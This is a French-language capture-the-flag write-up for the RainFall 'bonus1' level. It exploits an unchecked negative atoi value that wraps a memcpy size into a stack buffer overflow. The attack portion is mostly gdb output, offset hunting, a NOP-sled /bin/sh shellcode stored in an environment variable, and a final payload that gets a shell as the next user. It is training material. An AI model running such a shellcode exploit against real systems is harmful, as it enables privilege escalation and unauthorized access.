# Soluce

Payload : 
```
cat | ./bonus1 -2147483628 $(python -c 'print("A" * 56 + "\x1c\xf3\xff\xbf")')
```

## Description du code

-   2 variable sont declarer dans le main, un buffer d'une taille de 40 et un int, dest et v5
-   Ensuite cela fait un atoi sur argv[1] et stock le resultat dans v5 
-   Si v5 est superieur a 9 cela return 1
-   Cela fait un memcpy,qui copie argv[2] dans dest, d'une taille de 4 * v5, dans un size_t
-   Le reste du code ne sera pas important pour ce niveau

## Explication

On peu constater plusieur chose, deja la condition qui check v5 ne check pas si elle est negatif, du coup v5 peu etre un chiffre compris entre INT_MIN et 9, ensuite l'argument qui defini la taille de ce qui va etre copier dans dans dest est multiplié par 4 et est stocker dans un size_t qui est focement positif.

On va pouvoir du coup profiter du wrapping des limite de type pour faire overflow memcpy, testons les valeurs pour savoir les limites de type, avec notre programe en c :
```
#########################################################################
#include <stdio.h>                                                      #
#include <stdlib.h>                                                     #
                                                                        #
int main(int ac, char **av){                                            #
    int v5 = atoi(av[1]);                                               #
    printf("*4: %zu\n", (size_t)(4 * v5));                              #
    printf("*1: %zu\n", (size_t)(v5));                                  #
    printf("/4: %zu\n", ((size_t)(v5))/4);                              #
}                                                                       #
#########################################################################
```
```
bonus1@RainFall:/tmp$ ./doop -1
*4: 4294967292
*1: 4294967295
/4: 1073741823
bonus1@RainFall:/tmp$ ./doop 4294967295
*4: 4294967292
*1: 2147483647
/4: 536870911
bonus1@RainFall:/tmp$ ./doop -2147483647
*4: 4
*1: 2147483649
/4: 536870912
bonus1@RainFall:/tmp$ ./doop -2147483648
*4: 0
*1: 2147483648
/4: 536870912
bonus1@RainFall:/tmp$ ./doop -2147483618
*4: 120
*1: 2147483678
/4: 536870919
```
On peu en deduire ceci :

size_t est seulement un unsigned int ici, si l'on entre INT_MIN cela donne UINT_MAX + 1 donc 0, et cela sera la taille fournis a memcpy.
Plus qu'a retirer le nombre d'octet que l'on veut pour generer un buffer overflow :
```
bonus1@RainFall:~$ ./bonus1 -2147483618 $(python -c 'print("A" * 40')
Segmentation fault (core dumped)
```
maintenant observont les registre :
```
bonus1@RainFall:~$ gdb ./bonus1 

(gdb) b main
Breakpoint 1 at 0x8048427

(gdb) run  -2147483618 $(python -c 'print("A" * 40)')
Starting program: /home/user/bonus1/bonus1 -2147483618 $(python -c 'print("A" * 40)')

Breakpoint 1, 0x08048427 in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.
0x90909090 in ?? ()

(gdb) info r
eax            0x0      0
ecx            0x90909090       -1869574000
edx            0xbfffef5c       -1073746084
ebx            0xb7fd0ff4       -1208152076
esp            0xbfffef20       0xbfffef20
ebp            0x90909090       0x90909090
esi            0x0      0
edi            0x0      0
eip            0x90909090       0x90909090
eflags         0x200293 [ CF AF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

On vois bien que l'adresse de retour a ete overwrite, maintenant plus qu'as determiner l'offset :

```
(gdb) run  -2147483618 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus1/bonus1 -2147483618 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9

Breakpoint 1, 0x08048427 in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.
0x39624138 in ?? ()
(gdb) info r
eax            0x0      0
ecx            0x39644138       962871608
edx            0xbfffef0c       -1073746164
ebx            0xb7fd0ff4       -1208152076
esp            0xbfffeed0       0xbfffeed0
ebp            0x62413762       0x62413762
esi            0x0      0
edi            0x0      0
eip            0x39624138       0x39624138
eflags         0x200212 [ AF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

0x39624138 = 8Ab9 = 56 in Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9

maintenant plus qu'as faire notre payload.

## Payload :

On peu faire ret to libc ou un shellcode :

```
export SHELLCODE=$(python -c 'print("\x90" * 2000 + "1\xc0\xb0\xbe\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80")')

(gdb) run
Starting program: /home/user/bonus1/bonus1 

Breakpoint 1, 0x08048427 in main ()
(gdb) call (char*)getenv("SHELLCODE")
$1 = 0xbffff129 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
```
0xbffff129 + 500 = 0xbffff31d ; pour tomber dans le nop sled 

[ Int min + 30 ] + [ Padding de 56 ] + [ Adresse du shellcode + 500 ]
```
bonus1@RainFall:~$ cat | ./bonus1 -2147483628 $(python -c 'print("A" * 56 + "\x1c\xf3\xff\xbf")')
whoami
bonus2
```